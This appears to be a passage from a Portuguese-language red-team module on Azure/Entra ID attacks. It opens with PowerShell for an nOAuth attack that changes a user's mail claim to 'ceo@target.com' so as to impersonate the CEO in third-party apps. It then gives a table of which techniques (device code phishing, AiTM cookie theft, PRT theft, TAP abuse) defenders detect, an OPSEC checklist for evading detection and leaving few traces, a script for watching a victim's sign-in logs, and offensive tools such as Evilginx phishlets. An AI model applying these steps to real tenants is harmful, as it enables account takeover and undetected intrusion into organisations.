         ▼
App usa email como user identifier
         │
         │ Atacante agora é "ceo@target.com" no app
         ▼
Acesso a dados/conta do CEO no app terceiro
```

```powershell
# 1. Alterar email claim (como atacante autenticado)
$headers = @{
    Authorization = "Bearer $token"
    "Content-Type" = "application/json"
}

# Alterar email do próprio perfil
$body = @{
    mail = "ceo@target.com"
} | ConvertTo-Json

Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me" `
    -Method PATCH `
    -Headers $headers `
    -Body $body

# 2. Verificar claim após alteração
$me = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me" -Headers $headers
Write-Host "Email no perfil: $($me.mail)"

# 3. Obter novo token (claim email será o alterado)
# Usar Device Code ou ROPC para obter token
# Decodificar e verificar email claim no novo token
```

```bash
# Verificar se app alvo usa email claim como identifier
# Analisar o token que o app solicita
# Se scope inclui "email" e app usa email para login → vulnerável

# Identificar apps vulneráveis no tenant
curl -s "https://graph.microsoft.com/v1.0/applications" \
    -H "Authorization: Bearer $TOKEN" | \
    jq '.value[] | {displayName, identifierUris, web}'
```

---

## Detecção e OPSEC

### O Que Defesas Detectam vs. Não Detectam

```
TÉCNICA                          DETECTÁVEL?   POR QUÊ
─────────────────────────────────────────────────────────────────────
Device Code Phishing             Parcialmente  Sign-in log com device_code grant
                                              Possível: "Unfamiliar sign-in prop"
                                              Difícil: usuário fez MFA legitimamente

Legacy Auth (IMAP/POP3)          Sim           Sign-in log mostra "Other clients"
                                              Entra ID Protection: "Legacy protocol"
                                              Alert: se CAP está configurado corretamente

AiTM / Session Cookie            Difícil       Token válido, MFA completado
                                              MDCA pode detectar IP diferente
                                              CAE (se configurado): revoga em segundos

PRT Theft                        Difícil       PRT uso parece legítimo (device registered)
                                              Mimikatz em LSASS: Defender detecta
                                              ROADtoken: menos detectável

TAP Abuse                        Sim           TAP criação vai para Audit Log
                                              Se admin cria TAP para outro user: alerta
                                              TAP bug (token outlives): difícil detectar

AAD Graph 1.61-internal          Não           Sem audit log gerado
                                              Aparece como Graph API call normal

FOCI Token Exchange              Parcialmente  Aparece como sign-in com novo client_id
                                              Correlação requer análise de refresh_token

IMDS Token Request               Parcialmente  Aparece em ServicePrincipalSignInLogs
                                              IP é 169.254.169.254 (IMDS) → suspeito
                                              se VM não deveria estar fazendo calls

CAP Enumeration via Graph beta   Sim           Aparece em Audit Log (se logging config)
                                              Requer Graph API access

nOAuth (email claim change)      Parcialmente  Profile update vai para Audit Log
                                              Mas impacto em app terceiro: invisível

CBA cert theft (Key Vault)       Sim           Key Vault access log (se habilitado)
                                              Defender for Key Vault: alert possível
```

### OPSEC Checklist para Operações Azure

```
PRÉ-OPERAÇÃO:
□ Identificar tenant ID e nome (sem autenticar)
□ Mapear CAPs via 1.61-internal (sem audit log)
□ Verificar se MDCA está configurado (via headers de resposta)
□ Identificar Named Locations e ranges de IP confiáveis
□ Verificar horário de trabalho do usuário alvo (evitar "impossible travel")

DURANTE OPERAÇÃO:
□ Usar mesmo país/região de IP do usuário comprometido
□ Usar mesmos apps que o usuário normalmente usa
□ Não fazer downloads em massa — manter volume baixo
□ Preferir APIs diretas ao browser (evita MDCA proxy)
□ Não modificar permissões ou roles desnecessariamente
□ Manter tokens válidos — não tentar usar tokens expirados (gera error logs)

ESPECÍFICO POR TÉCNICA:
□ Device Code: enviar via canal que não deixa rastro (SMS, WhatsApp, presencial)
□ FOCI: usar apenas client IDs conhecidos da família
□ TAP: criar TAP como admin e usar dentro da janela de tempo
□ IMDS: acessar apenas recursos necessários, não fazer enum desnecessário
□ Legacy Auth: verificar se habilitado antes de tentar (testa 1 conta, não 100)

PÓS-OPERAÇÃO:
□ Verificar se há alertas no Entra ID Protection para usuário comprometido
□ Verificar se CAP bloqueou acesso (check logs se possível)
□ Limpar TAPs criados (se possível sem levantar suspeita)
□ Não deletar logs — gera alerta de log tampering
```

### Monitorar Logs Durante Red Team

```powershell
# Como Red Team: verificar seus próprios rastros
$adminToken = "<global_admin_token>"
$headers = @{ Authorization = "Bearer $adminToken" }

# Ver sign-in logs recentes do usuário comprometido
$logs = Invoke-RestMethod `
    -Uri "https://graph.microsoft.com/v1.0/auditLogs/signIns?`$filter=userPrincipalName eq 'victim@target.com'&`$top=20&`$orderby=createdDateTime desc" `
    -Headers $headers

$logs.value | Select-Object createdDateTime, ipAddress, clientAppUsed, status, `
    @{N="riskLevel";E={$_.riskLevelDuringSignIn}}, `
    @{N="riskState";E={$_.riskState}}

# Ver risk events
$risks = Invoke-RestMethod `
    -Uri "https://graph.microsoft.com/v1.0/identityProtection/riskDetections?`$filter=userPrincipalName eq 'victim@target.com'" `
    -Headers $headers

$risks.value | Select-Object riskType, riskLevel, detectedDateTime, activity
```

---

## Módulos Relacionados

`12_azure_fundamentos_e_enumeracao.md` cobre OAuth 2.0, token types, Graph API e Mg Module. `13_azure_acesso_inicial.md` traz Device Code Phishing completo, FOCI client IDs e AiTM setup. `14_azure_enum_privesc.md` cobre enumeração de CAP, TAP creation e PIM activation. `15_azure_lateral_movement.md` aprofunda IMDS, TAP cross-tenant e token extraction (WAMBam, mitmdump). `17_azure_cicd_abuse.md` cobre Logic Apps callback URLs e Function Apps bypass. `18_azure_cheatsheet.md` traz JWT decode, FOCI client IDs e token lifetimes.

### Ferramentas Essenciais

| Ferramenta | Propósito | Comando Principal |
|------------|-----------|-------------------|
| TokenTactics | Device Code + FOCI | `Invoke-DeviceCodePhishing` |
| AADInternals | PRT theft + TAP + CAP | `Get-AADIntConditionalAccessPolicies` |
| Evilginx3 | AiTM session theft | `phishlets enable microsoft` |
| ROADtools | Tenant enum + CAP | `roadrecon gather` |
| WAMBam | TokenBroker cache | `WAMBam.exe` |
| jwt.io | JWT decode (web) | Browser |
| jq + python3 | JWT decode (CLI) | `cut -d'.' -f2 | python3 -c "..."` |
